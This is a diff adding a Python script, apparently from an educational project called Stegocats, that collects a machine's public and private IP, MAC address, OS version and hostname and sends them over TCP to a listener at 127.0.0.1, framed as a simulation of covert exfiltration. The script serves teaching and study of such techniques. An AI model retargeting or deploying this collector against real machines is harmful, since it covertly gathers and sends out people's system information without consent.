@@ -1,0 +1,86 @@
+# python
+
+# disclaimer
+# THIS SCRIPT IS FOR EDUCATIONAL PURPOSES
+# PLEASE USE STEGOCATS ETHICALLY
+
+# using tcpserver.py to create a TCP server instance on our local machine,
+# we can simulate the covert exfiltration of system information from a client's machine to a remote server
+
+
+import socket
+import requests
+import uuid
+import platform
+
+def get_public_ip():
+    try:
+        response = requests.get('https://api.ipify.org?format=json')
+        if response.status_code == 200:
+            return response.json()['ip']
+    except requests.RequestException:
+        pass
+    return None
+
+def get_mac_address():
+    try:
+        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0, 8 * 6, 8)][::-1])
+        return mac
+    except Exception:
+        pass
+    return None
+
+def get_private_ip():
+    try:
+        # Create a temporary socket to get the private IP
+        temp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        temp_socket.connect(("8.8.8.8", 80))  # Google DNS IP
+        private_ip = temp_socket.getsockname()[0]
+        temp_socket.close()
+        return private_ip
+    except Exception:
+        pass
+    return None
+
+def get_os_version():
+    try:
+        return platform.platform()
+    except Exception:
+        pass
+    return None
+
+def get_hostname():
+    try:
+        return socket.gethostname()
+    except Exception:
+        pass
+    return None
+
+if __name__ == "__main__":
+    public_ip = get_public_ip()
+    mac_address = get_mac_address()
+    private_ip = get_private_ip()
+    os_version = get_os_version()
+    hostname = get_hostname()
+
+    # send data to target IP and port
+    target_host = "127.0.0.1"
+    target_port = 9999
+
+    try:
+        # create a socket object
+        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # connect the client
+        client.connect((target_host, target_port))
+        # combine data into a string
+        data = f"MAC Address: {mac_address} | Public IP Address: {public_ip} | Private IP Address: {private_ip} | OS Version: {os_version} | Hostname: {hostname}"
+        # send data
+        client.send(data.encode('utf-8'))
+        # receive some data
+        response = client.recv(4096)
+        print(response.decode('utf-8'))
+    except Exception as e:
+        print(f"Error: {e}")
+    finally:
+        client.close()
+
